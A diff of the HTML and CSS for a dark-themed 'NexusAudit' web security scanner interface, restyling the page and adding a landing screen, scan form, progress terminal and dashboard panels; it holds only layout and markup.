@@ -1,1233 +1,260 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NexusAudit Security Scanner</title>
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
-
-<style>
-  :root {
-    --bg-deep: #0a0e1a;
-    --bg-elevated: #1a1f35;
-    --matrix-green: #00ff41;
-    --cyber-cyan: #00d9ff;
-    --alert-red: #ff0055;
-    --warning-amber: #ffd000;
-    --text-primary: #e8edf4;
-    --text-secondary: #8b95a8;
-    --text-dim: #4a5568;
-    --border-subtle: rgba(0, 217, 255, 0.15);
-    --glow-green: rgba(0, 255, 65, 0.4);
-    --glow-cyan: rgba(0, 217, 255, 0.3);
-    --glow-red: rgba(255, 0, 85, 0.4);
-  }
-
-  @media (prefers-color-scheme: light) {
-    :root:not([data-theme="dark"]) {
-      --bg-deep: #ffffff;
-      --bg-elevated: #f7f9fc;
-      --matrix-green: #00aa2b;
-      --cyber-cyan: #0088cc;
-      --alert-red: #cc0044;
-      --warning-amber: #cc8800;
-      --text-primary: #1a202c;
-      --text-secondary: #4a5568;
-      --text-dim: #a0aec0;
-      --border-subtle: rgba(0, 136, 204, 0.2);
-      --glow-green: rgba(0, 170, 43, 0.2);
-      --glow-cyan: rgba(0, 136, 204, 0.15);
-      --glow-red: rgba(204, 0, 68, 0.2);
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NexusAudit Security Scanner</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg-deep: #0a0e1a;
+      --bg-elevated: #171d2f;
+      --matrix-green: #00ff41;
+      --cyber-cyan: #00d9ff;
+      --alert-red: #ff0055;
+      --warning-amber: #ffd000;
+      --text-primary: #edf3ff;
+      --text-secondary: #9aa6ba;
+      --text-dim: #5d6477;
+      --border-subtle: rgba(0, 217, 255, 0.15);
     }
-  }
-
-  :root[data-theme="light"] {
-    --bg-deep: #ffffff;
-    --bg-elevated: #f7f9fc;
-    --matrix-green: #00aa2b;
-    --cyber-cyan: #0088cc;
-    --alert-red: #cc0044;
-    --warning-amber: #cc8800;
-    --text-primary: #1a202c;
-    --text-secondary: #4a5568;
-    --text-dim: #a0aec0;
-    --border-subtle: rgba(0, 136, 204, 0.2);
-    --glow-green: rgba(0, 170, 43, 0.2);
-    --glow-cyan: rgba(0, 136, 204, 0.15);
-    --glow-red: rgba(204, 0, 68, 0.2);
-  }
-
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-
-  body {
-    font-family: 'Inter', system-ui, sans-serif;
-    background: var(--bg-deep);
-    color: var(--text-primary);
-    min-height: 100vh;
-    overflow-x: hidden;
-    line-height: 1.6;
-  }
-
-  .mono {
-    font-family: 'JetBrains Mono', 'Consolas', monospace;
-  }
-
-  #canvas-container {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 0;
-    pointer-events: none;
-  }
-
-  .content-layer {
-    position: relative;
-    z-index: 1;
-  }
-
-  /* Header */
-  header {
-    background: rgba(26, 31, 53, 0.8);
-    backdrop-filter: blur(16px);
-    border-bottom: 1px solid var(--border-subtle);
-    padding: 1rem 2rem;
-    position: sticky;
-    top: 0;
-    z-index: 100;
-  }
-
-  .header-inner {
-    max-width: 1400px;
-    margin: 0 auto;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    gap: 2rem;
-    flex-wrap: wrap;
-  }
-
-  .logo {
-    display: flex;
-    align-items: center;
-    gap: 0.75rem;
-  }
-
-  .logo-icon {
-    width: 40px;
-    height: 40px;
-    background: linear-gradient(135deg, var(--matrix-green), var(--cyber-cyan));
-    border-radius: 8px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    box-shadow: 0 4px 16px var(--glow-cyan);
-    font-size: 1.25rem;
-  }
-
-  .logo-text {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 1.5rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-  }
-
-  .logo-text .accent {
-    color: var(--matrix-green);
-    text-shadow: 0 0 8px var(--glow-green);
-  }
-
-  .header-status {
-    display: flex;
-    align-items: center;
-    gap: 1rem;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.75rem;
-  }
-
-  .status-pill {
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 0.5rem 1rem;
-    background: rgba(0, 255, 65, 0.1);
-    border: 1px solid rgba(0, 255, 65, 0.3);
-    border-radius: 999px;
-    color: var(--matrix-green);
-  }
-
-  .status-dot {
-    width: 8px;
-    height: 8px;
-    background: var(--matrix-green);
-    border-radius: 50%;
-    animation: pulse 2s ease-in-out infinite;
-  }
-
-  @keyframes pulse {
-    0%, 100% { opacity: 1; transform: scale(1); }
-    50% { opacity: 0.6; transform: scale(0.9); }
-  }
-
-  /* Main Content */
-  main {
-    max-width: 1400px;
-    margin: 0 auto;
-    padding: 3rem 2rem;
-  }
-
-  /* Hero Section */
-  .hero {
-    text-align: center;
-    margin-bottom: 4rem;
-  }
-
-  .hero h1 {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: clamp(2rem, 5vw, 3.5rem);
-    font-weight: 700;
-    margin-bottom: 1rem;
-    letter-spacing: -0.02em;
-    line-height: 1.1;
-    text-wrap: balance;
-  }
-
-  .hero .highlight {
-    color: var(--cyber-cyan);
-    text-shadow: 0 0 20px var(--glow-cyan);
-  }
-
-  .hero p {
-    font-size: 1rem;
-    color: var(--text-secondary);
-    max-width: 600px;
-    margin: 0 auto 2.5rem;
-  }
-
-  /* Scanner Input */
-  .scanner-form {
-    background: rgba(26, 31, 53, 0.6);
-    backdrop-filter: blur(12px);
-    border: 1px solid var(--border-subtle);
-    border-radius: 16px;
-    padding: 1.5rem;
-    display: flex;
-    gap: 1rem;
-    max-width: 800px;
-    margin: 0 auto;
-    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-    flex-wrap: wrap;
-  }
-
-  .input-wrapper {
-    flex: 1;
-    min-width: 250px;
-    position: relative;
-  }
-
-  .input-icon {
-    position: absolute;
-    left: 1rem;
-    top: 50%;
-    transform: translateY(-50%);
-    color: var(--text-dim);
-    pointer-events: none;
-  }
-
-  input[type="text"] {
-    width: 100%;
-    padding: 1rem 1rem 1rem 2.75rem;
-    background: rgba(10, 14, 26, 0.8);
-    border: 1px solid rgba(0, 217, 255, 0.2);
-    border-radius: 12px;
-    color: var(--text-primary);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.95rem;
-    transition: all 0.2s;
-  }
-
-  input[type="text"]:focus {
-    outline: none;
-    border-color: var(--cyber-cyan);
-    box-shadow: 0 0 0 3px var(--glow-cyan);
-  }
-
-  input[type="text"]::placeholder {
-    color: var(--text-dim);
-  }
-
-  .scan-btn {
-    padding: 1rem 2rem;
-    background: linear-gradient(135deg, var(--matrix-green), var(--cyber-cyan));
-    border: none;
-    border-radius: 12px;
-    color: var(--bg-deep);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.95rem;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.2s;
-    box-shadow: 0 4px 16px var(--glow-cyan);
-    white-space: nowrap;
-  }
-
-  .scan-btn:hover:not(:disabled) {
-    transform: translateY(-2px);
-    box-shadow: 0 6px 24px var(--glow-cyan);
-  }
-
-  .scan-btn:active:not(:disabled) {
-    transform: translateY(0);
-  }
-
-  .scan-btn:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-  }
-
-  /* Terminal Status */
-  .terminal-status {
-    background: rgba(10, 14, 26, 0.9);
-    backdrop-filter: blur(12px);
-    border: 1px solid var(--border-subtle);
-    border-radius: 16px;
-    padding: 1.5rem;
-    margin: 2rem auto;
-    max-width: 900px;
-    font-family: 'JetBrains Mono', monospace;
-    display: none;
-  }
-
-  .terminal-status.active {
-    display: block;
-  }
-
-  .terminal-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 1rem;
-    padding-bottom: 0.75rem;
-    border-bottom: 1px solid var(--border-subtle);
-  }
-
-  .terminal-label {
-    color: var(--cyber-cyan);
-    font-size: 0.9rem;
-    font-weight: 600;
-  }
-
-  .progress-percent {
-    color: var(--matrix-green);
-    font-weight: 700;
-  }
-
-  .progress-bar {
-    height: 8px;
-    background: rgba(0, 217, 255, 0.1);
-    border-radius: 4px;
-    overflow: hidden;
-    margin-bottom: 1rem;
-  }
-
-  .progress-fill {
-    height: 100%;
-    background: linear-gradient(90deg, var(--matrix-green), var(--cyber-cyan));
-    width: 0;
-    transition: width 0.3s ease;
-    box-shadow: 0 0 8px var(--glow-cyan);
-  }
-
-  .terminal-log {
-    font-size: 0.8rem;
-    color: var(--text-secondary);
-    max-height: 150px;
-    overflow-y: auto;
-    line-height: 1.8;
-  }
-
-  .terminal-log div {
-    margin-bottom: 0.25rem;
-  }
-
-  .terminal-log .success {
-    color: var(--matrix-green);
-  }
-
-  .terminal-log .error {
-    color: var(--alert-red);
-  }
-
-  /* Results Dashboard */
-  .dashboard {
-    display: none;
-    gap: 2rem;
-  }
-
-  .dashboard.active {
-    display: block;
-  }
-
-  /* Metrics Grid */
-  .metrics {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-    gap: 1rem;
-    margin-bottom: 2rem;
-  }
-
-  .metric-card {
-    background: rgba(26, 31, 53, 0.6);
-    backdrop-filter: blur(12px);
-    border: 1px solid var(--border-subtle);
-    border-radius: 16px;
-    padding: 1.5rem;
-    position: relative;
-    overflow: hidden;
-  }
-
-  .metric-card::before {
-    content: '';
-    position: absolute;
-    left: 0;
-    top: 0;
-    bottom: 0;
-    width: 4px;
-  }
-
-  .metric-card.critical::before {
-    background: var(--alert-red);
-    box-shadow: 0 0 12px var(--glow-red);
-  }
-
-  .metric-card.warning::before {
-    background: var(--warning-amber);
-  }
-
-  .metric-card.info::before {
-    background: var(--cyber-cyan);
-    box-shadow: 0 0 12px var(--glow-cyan);
-  }
-
-  .metric-card.success::before {
-    background: var(--matrix-green);
-    box-shadow: 0 0 12px var(--glow-green);
-  }
-
-  .metric-label {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.75rem;
-    text-transform: uppercase;
-    letter-spacing: 0.05em;
-    color: var(--text-secondary);
-    margin-bottom: 0.5rem;
-  }
-
-  .metric-value {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 2.5rem;
-    font-weight: 700;
-    line-height: 1;
-  }
-
-  .metric-card.critical .metric-value {
-    color: var(--alert-red);
-  }
-
-  .metric-card.warning .metric-value {
-    color: var(--warning-amber);
-  }
-
-  .metric-card.info .metric-value {
-    color: var(--cyber-cyan);
-  }
-
-  .metric-card.success .metric-value {
-    color: var(--matrix-green);
-  }
-
-  /* Results Grid */
-  .results-grid {
-    display: grid;
-    grid-template-columns: 2fr 1fr;
-    gap: 2rem;
-  }
-
-  @media (max-width: 1024px) {
-    .results-grid {
-      grid-template-columns: 1fr;
-    }
-  }
-
-  /* Vulnerabilities Panel */
-  .panel {
-    background: rgba(26, 31, 53, 0.6);
-    backdrop-filter: blur(12px);
-    border: 1px solid var(--border-subtle);
-    border-radius: 16px;
-    padding: 2rem;
-  }
-
-  .panel-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 1.5rem;
-    padding-bottom: 1rem;
-    border-bottom: 1px solid var(--border-subtle);
-  }
-
-  .panel-title {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 1.25rem;
-    font-weight: 600;
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-  }
-
-  .panel-badge {
-    font-size: 0.75rem;
-    padding: 0.25rem 0.75rem;
-    background: rgba(0, 217, 255, 0.1);
-    border: 1px solid var(--border-subtle);
-    border-radius: 999px;
-    color: var(--text-secondary);
-  }
-
-  .vuln-list {
-    display: flex;
-    flex-direction: column;
-    gap: 1rem;
-  }
-
-  .vuln-card {
-    background: rgba(10, 14, 26, 0.6);
-    border: 1px solid var(--border-subtle);
-    border-radius: 12px;
-    padding: 1.25rem;
-    cursor: pointer;
-    transition: all 0.2s;
-    position: relative;
-  }
-
-  .vuln-card:hover {
-    border-color: var(--cyber-cyan);
-    transform: translateX(4px);
-    box-shadow: 0 4px 16px rgba(0, 217, 255, 0.2);
-  }
-
-  .vuln-card.selected {
-    border-color: var(--matrix-green);
-    box-shadow: 0 4px 16px var(--glow-green);
-  }
-
-  .vuln-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: flex-start;
-    gap: 1rem;
-    margin-bottom: 0.75rem;
-  }
-
-  .severity-badge {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.7rem;
-    font-weight: 600;
-    padding: 0.25rem 0.75rem;
-    border-radius: 4px;
-    text-transform: uppercase;
-    letter-spacing: 0.05em;
-    white-space: nowrap;
-  }
-
-  .severity-badge.critical {
-    background: rgba(255, 0, 85, 0.2);
-    color: var(--alert-red);
-    border: 1px solid var(--alert-red);
-  }
-
-  .severity-badge.high {
-    background: rgba(255, 85, 0, 0.2);
-    color: #ff5500;
-    border: 1px solid #ff5500;
-  }
-
-  .severity-badge.medium {
-    background: rgba(255, 208, 0, 0.2);
-    color: var(--warning-amber);
-    border: 1px solid var(--warning-amber);
-  }
-
-  .severity-badge.low {
-    background: rgba(0, 217, 255, 0.2);
-    color: var(--cyber-cyan);
-    border: 1px solid var(--cyber-cyan);
-  }
-
-  .severity-badge.info {
-    background: rgba(139, 149, 168, 0.2);
-    color: var(--text-secondary);
-    border: 1px solid var(--text-dim);
-  }
-
-  .vuln-title {
-    font-weight: 600;
-    font-size: 0.95rem;
-    margin-bottom: 0.5rem;
-    color: var(--text-primary);
-  }
-
-  .vuln-desc {
-    font-size: 0.85rem;
-    color: var(--text-secondary);
-    line-height: 1.5;
-  }
-
-  /* Exploit Panel */
-  .exploit-console {
-    background: rgba(10, 14, 26, 0.9);
-    border: 1px solid rgba(0, 255, 65, 0.2);
-    border-radius: 12px;
-    padding: 1.5rem;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.8rem;
-    line-height: 1.6;
-    min-height: 400px;
-    max-height: 600px;
-    overflow-y: auto;
-    color: var(--matrix-green);
-  }
-
-  .console-header {
-    color: var(--cyber-cyan);
-    font-weight: 600;
-    margin-bottom: 0.75rem;
-  }
-
-  .console-section {
-    margin-bottom: 1.5rem;
-  }
-
-  .console-label {
-    color: var(--warning-amber);
-    font-weight: 600;
-    margin-bottom: 0.5rem;
-  }
-
-  .console-code {
-    background: rgba(0, 0, 0, 0.4);
-    border: 1px solid rgba(0, 255, 65, 0.1);
-    border-radius: 8px;
-    padding: 1rem;
-    overflow-x: auto;
-    white-space: pre-wrap;
-    word-break: break-all;
-    color: var(--matrix-green);
-  }
-
-  .console-text {
-    color: var(--text-secondary);
-  }
-
-  .console-remediation {
-    background: rgba(0, 217, 255, 0.1);
-    border: 1px solid var(--cyber-cyan);
-    border-radius: 8px;
-    padding: 1rem;
-    margin-top: 1rem;
-  }
-
-  .console-remediation .console-label {
-    color: var(--cyber-cyan);
-  }
-
-  .empty-state {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    height: 100%;
-    color: var(--text-dim);
-    font-style: italic;
-    text-align: center;
-  }
-
-  /* Footer */
-  footer {
-    margin-top: 4rem;
-    padding: 2rem;
-    text-align: center;
-    border-top: 1px solid var(--border-subtle);
-    background: rgba(26, 31, 53, 0.4);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--text-dim);
-  }
-
-  /* Scrollbar */
-  ::-webkit-scrollbar {
-    width: 8px;
-    height: 8px;
-  }
-
-  ::-webkit-scrollbar-track {
-    background: rgba(10, 14, 26, 0.5);
-  }
-
-  ::-webkit-scrollbar-thumb {
-    background: rgba(0, 217, 255, 0.3);
-    border-radius: 4px;
-  }
-
-  ::-webkit-scrollbar-thumb:hover {
-    background: rgba(0, 217, 255, 0.5);
-  }
-</style>
-
-<div id="canvas-container"></div>
-
-<div class="content-layer">
-  <header>
-    <div class="header-inner">
-      <div class="logo">
-        <div class="logo-icon">🔒</div>
-        <div class="logo-text">NEXUS<span class="accent">AUDIT</span></div>
-      </div>
-      <div class="header-status">
-        <div class="status-pill">
-          <div class="status-dot"></div>
-          <span>SYSTEM ONLINE</span>
-        </div>
-        <span class="mono" style="color: var(--text-dim)">v4.2.0</span>
-      </div>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-deep); color: var(--text-primary); min-height: 100vh; overflow-x: hidden; }
+    #canvas-bg { position: fixed; inset: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; opacity: 0.9; }
+    .content { position: relative; z-index: 1; }
+    .landing { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 2rem; animation: fadeIn .8s ease-out; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    .logo-large { width: 120px; height: 120px; border-radius: 24px; margin-bottom: 2rem; display: grid; place-items: center; font-size: 4rem; background: linear-gradient(135deg, var(--matrix-green), var(--cyber-cyan)); box-shadow: 0 0 60px rgba(0,255,65,.45); animation: float 3s ease-in-out infinite; }
+    @keyframes float { 0%,100% { transform: translateY(0) } 50% { transform: translateY(-18px) } }
+    .landing h1 { font-family: 'JetBrains Mono', monospace; font-size: clamp(2.6rem,8vw,5rem); letter-spacing: -0.04em; margin-bottom: 1rem; text-shadow: 0 0 30px rgba(0,217,255,.45); }
+    .highlight { color: var(--matrix-green); }
+    .landing p { max-width: 650px; color: var(--text-secondary); font-size: 1.1rem; margin: 0 auto 2.5rem; }
+    .enter-btn { padding: 1.25rem 2.5rem; border: none; border-radius: 16px; color: #02130b; background: linear-gradient(135deg, var(--matrix-green), var(--cyber-cyan)); font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 1rem; letter-spacing: 0.04em; cursor: pointer; transition: transform 0.2s ease, box-shadow 0.2s ease; box-shadow: 0 10px 30px rgba(0,255,65,.4); }
+    .enter-btn:hover { transform: translateY(-3px); box-shadow: 0 16px 40px rgba(0,217,255,.3); }
+    .scanner-page { display: none; min-height: 100vh; animation: slideIn .5s ease-out; }
+    .scanner-page.active { display: block; }
+    @keyframes slideIn { from { opacity: 0; transform: translateX(16px); } to { opacity: 1; transform: translateX(0); } }
+    header { background: rgba(23,29,47,.9); backdrop-filter: blur(16px); border-bottom: 1px solid var(--border-subtle); padding: 1rem 2rem; position: sticky; top: 0; z-index: 10; }
+    .header-inner { max-width: 1400px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; gap: 1rem; flex-wrap: wrap; }
+    .logo { display: flex; align-items: center; gap: 0.75rem; }
+    .logo-icon { width: 42px; height: 42px; border-radius: 10px; display: grid; place-items: center; background: linear-gradient(135deg, var(--matrix-green), var(--cyber-cyan)); box-shadow: 0 4px 18px rgba(0,217,255,.3); font-size: 1.1rem; }
+    .logo-text { font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; font-weight: 700; letter-spacing: -0.04em; }
+    .logo-text .accent { color: var(--matrix-green); }
+    .status-pill { display: inline-flex; align-items: center; gap: 0.6rem; padding: 0.55rem 1rem; border-radius: 999px; color: var(--matrix-green); background: rgba(0,255,65,.08); border: 1px solid rgba(0,255,65,.28); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; }
+    .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--matrix-green); animation: pulse 2s ease-in-out infinite; }
+    @keyframes pulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.45; transform: scale(.9) } }
+    main { max-width: 1400px; margin: 0 auto; padding: 3rem 2rem 4rem; }
+    .hero { text-align: center; margin-bottom: 3rem; }
+    .hero h1 { font-family: 'JetBrains Mono', monospace; font-size: clamp(2.1rem,5vw,3.6rem); margin-bottom: 1rem; letter-spacing: -0.04em; }
+    .hero p { max-width: 760px; margin: 0 auto 2.4rem; color: var(--text-secondary); }
+    .scanner-form { max-width: 900px; margin: 0 auto; background: rgba(23,29,47,.72); border: 1px solid var(--border-subtle); border-radius: 18px; display: flex; align-items: center; gap: 1rem; padding: 1.2rem; flex-wrap: wrap; box-shadow: 0 16px 40px rgba(0,0,0,.22); }
+    .input-wrapper { flex: 1; min-width: 260px; position: relative; }
+    .input-icon { position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); font-size: 1rem; pointer-events: none; }
+    input[type="text"] { width: 100%; padding: 1rem 1rem 1rem 2.8rem; color: var(--text-primary); background: rgba(10,14,26,.7); border: 1px solid rgba(0,217,255,.2); border-radius: 12px; font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; outline: none; transition: border-color .2s ease, box-shadow .2s ease; }
+    input[type="text"]:focus { border-color: var(--cyber-cyan); box-shadow: 0 0 0 3px rgba(0,217,255,.12); }
+    .scan-btn { background: linear-gradient(135deg, var(--matrix-green), var(--cyber-cyan)); color: #06130d; border: none; border-radius: 12px; padding: 1rem 1.8rem; cursor: pointer; font-family: 'JetBrains Mono', monospace; font-weight: 700; transition: transform .2s ease, opacity .2s ease; white-space: nowrap; box-shadow: 0 8px 24px rgba(0,217,255,.25); }
+    .scan-btn:hover:not(:disabled) { transform: translateY(-2px); }
+    .scan-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+    .terminal-status { max-width: 980px; margin: 1.5rem auto 2rem; border: 1px solid var(--border-subtle); background: rgba(10,14,26,.9); border-radius: 16px; padding: 1.3rem; display: none; font-family: 'JetBrains Mono', monospace; }
+    .terminal-status.active { display: block; }
+    .terminal-header { display: flex; align-items: center; justify-content: space-between; gap: 1rem; margin-bottom: 0.8rem; padding-bottom: 0.75rem; border-bottom: 1px solid var(--border-subtle); }
+    .terminal-label { color: var(--cyber-cyan); }
+    .progress-percent { color: var(--matrix-green); }
+    .progress-bar { height: 8px; border-radius: 999px; overflow: hidden; background: rgba(0,217,255,.08); margin-bottom: 1rem; }
+    .progress-fill { width: 0; height: 100%; background: linear-gradient(90deg, var(--matrix-green), var(--cyber-cyan)); transition: width .25s ease; }
+    .terminal-log { font-size: 0.8rem; color: var(--text-secondary); max-height: 170px; overflow-y: auto; line-height: 1.9; }
+    .dashboard { display: none; margin-top: 2rem; }
+    .dashboard.active { display: block; }
+    .metrics { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2rem; }
+    .metric-card { background: rgba(23,29,47,.8); border: 1px solid var(--border-subtle); border-radius: 16px; padding: 1.35rem; position: relative; overflow: hidden; }
+    .metric-card::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 4px; background: var(--cyber-cyan); }
+    .metric-card.critical::before { background: var(--alert-red); }
+    .metric-card.warning::before { background: var(--warning-amber); }
+    .metric-card.success::before { background: var(--matrix-green); }
+    .metric-label { font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 0.6rem; }
+    .metric-value { font-family: 'JetBrains Mono', monospace; font-size: clamp(1.8rem,3vw,2.6rem); font-weight: 700; line-height: 1.1; }
+    .results-grid { display: grid; grid-template-columns: 1.3fr 1fr; gap: 2rem; }
+    @media (max-width: 980px) { .results-grid { grid-template-columns: 1fr; } }
+    .panel { background: rgba(23,29,47,.76); border: 1px solid var(--border-subtle); border-radius: 18px; padding: 1.5rem; }
+    .panel-header { display: flex; align-items: center; justify-content: space-between; gap: 0.8rem; margin-bottom: 1.25rem; padding-bottom: 0.9rem; border-bottom: 1px solid var(--border-subtle); }
+    .panel-title { font-family: 'JetBrains Mono', monospace; font-size: 1.05rem; font-weight: 600; }
+    .panel-badge { padding: 0.32rem 0.7rem; border-radius: 999px; background: rgba(0,217,255,.08); border: 1px solid var(--border-subtle); color: var(--text-secondary); font-size: 0.72rem; font-family: 'JetBrains Mono', monospace; }
+    .vuln-list { display: flex; flex-direction: column; gap: 0.9rem; }
+    .vuln-card { background: rgba(10,14,26,.62); border: 1px solid var(--border-subtle); border-radius: 12px; padding: 1rem 1.05rem; cursor: pointer; transition: transform .2s ease, border-color .2s ease; }
+    .vuln-card:hover { transform: translateX(3px); border-color: var(--cyber-cyan); }
+    .vuln-card.selected { border-color: var(--matrix-green); box-shadow: 0 0 0 1px rgba(0,255,65,.3); }
+    .vuln-header { display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem; margin-bottom: 0.45rem; }
+    .vuln-title { font-weight: 600; margin-bottom: 0.25rem; }
+    .vuln-desc { color: var(--text-secondary); font-size: 0.85rem; line-height: 1.5; }
+    .severity-badge { border-radius: 6px; padding: 0.3rem 0.55rem; font-family: 'JetBrains Mono', monospace; font-size: 0.68rem; font-weight: 700; letter-spacing: 0.04em; text-transform: uppercase; white-space: nowrap; }
+    .severity-badge.critical { background: rgba(255,0,85,.12); color: var(--alert-red); border: 1px solid rgba(255,0,85,.32); }
+    .severity-badge.high { background: rgba(255,85,0,.12); color: #ff7c00; border: 1px solid rgba(255,124,0,.28); }
+    .severity-badge.medium { background: rgba(255,208,0,.12); color: var(--warning-amber); border: 1px solid rgba(255,208,0,.28); }
+    .severity-badge.low { background: rgba(0,217,255,.08); color: var(--cyber-cyan); border: 1px solid rgba(0,217,255,.18); }
+    .severity-badge.info { background: rgba(0,255,65,.08); color: var(--matrix-green); border: 1px solid rgba(0,255,65,.2); }
+    .exploit-console { min-height: 340px; background: rgba(10,14,26,.88); border: 1px solid rgba(0,255,65,.18); border-radius: 12px; padding: 1.25rem; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.8; color: var(--matrix-green); }
+    .empty-state { height: 100%; min-height: 280px; display: grid; place-items: center; color: var(--text-dim); font-style: italic; }
+    .console-section { margin-bottom: 1.1rem; }
+    .console-label { color: var(--warning-amber); margin-bottom: 0.4rem; font-weight: 700; }
+    .console-code { background: rgba(0,0,0,.25); border: 1px solid rgba(0,255,65,.12); border-radius: 8px; padding: 0.9rem; white-space: pre-wrap; word-break: break-word; color: var(--matrix-green); }
+    footer { padding: 2rem 1rem 3rem; text-align: center; color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; }
+  </style>
+</head>
+<body>
+  <canvas id="canvas-bg"></canvas>
+  <div class="content">
+    <div class="landing" id="landingPage">
+      <div class="logo-large">🔒</div>
+      <h1>NEXUS<span class="highlight">AUDIT</span></h1>
+      <p>Advanced web security scanner with real-time vulnerability detection, remediation guidance, and exploit analysis.</p>
+      <button class="enter-btn" onclick="enterScanner()">ENTER SCANNER ⚡</button>
     </div>
-  </header>
-
-  <main>
-    <section class="hero">
-      <h1>Advanced Web <span class="highlight">Security</span> Scanner</h1>
-      <p>Real-time vulnerability detection, security header analysis, and penetration testing for any web target.</p>
-
-      <div class="scanner-form">
-        <div class="input-wrapper">
-          <div class="input-icon">🌐</div>
-          <input type="text" id="targetUrl" placeholder="https://example.com" />
+    <div class="scanner-page" id="scannerPage">
+      <header>
+        <div class="header-inner">
+          <div class="logo"><div class="logo-icon">🔒</div><div class="logo-text">NEXUS<span class="accent">AUDIT</span></div></div>
+          <div class="status-pill"><span class="status-dot"></span><span>SYSTEM ONLINE</span></div>
         </div>
-        <button class="scan-btn" id="scanBtn" onclick="startScan()">
-          <span class="mono">INITIALIZE SCAN ⚡</span>
-        </button>
-      </div>
-    </section>
-
-    <div class="terminal-status" id="terminalStatus">
-      <div class="terminal-header">
-        <div class="terminal-label" id="statusText">Initializing scan...</div>
-        <div class="progress-percent" id="progressPercent">0%</div>
-      </div>
-      <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
-      </div>
-      <div class="terminal-log" id="terminalLog">
-        <div>[>] Target validation ready...</div>
-      </div>
-    </div>
-
-    <div class="dashboard" id="dashboard">
-      <div class="metrics" id="metricsGrid">
-        <!-- Metrics populated dynamically -->
-      </div>
-
-      <div class="results-grid">
-        <div class="panel">
-          <div class="panel-header">
-            <div class="panel-title">
-              ⚠️ Vulnerabilities Detected
-            </div>
-            <div class="panel-badge mono" id="targetLabel">—</div>
+      </header>
+      <main>
+        <section class="hero">
+          <h1>Advanced Web <span class="highlight">Security</span> Scanner</h1>
+          <p>Analyze domains for exposed issues, misconfigurations, and high-risk vulnerabilities with a guided security audit workflow.</p>
+          <div class="scanner-form">
+            <div class="input-wrapper"><div class="input-icon">🌐</div><input type="text" id="targetUrl" placeholder="https://example.com" /></div>
+            <button class="scan-btn" id="scanBtn" onclick="startScan()">INITIALIZE SCAN ⚡</button>
           </div>
-          <div class="vuln-list" id="vulnList">
-            <!-- Vulnerabilities populated dynamically -->
+        </section>
+        <div class="terminal-status" id="terminalStatus">
+          <div class="terminal-header">
+            <div class="terminal-label" id="statusText">Initializing scan...</div>
+            <div class="progress-percent" id="progressPercent">0%</div>
           </div>
+          <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+          <div class="terminal-log" id="terminalLog"><div>[>] Target validation ready...</div></div>
         </div>
-
-        <div class="panel">
-          <div class="panel-header">
-            <div class="panel-title">
-              🔬 Exploit Analysis
+        <div class="dashboard" id="dashboard">
+          <div class="metrics" id="metricsGrid"></div>
+          <div class="results-grid">
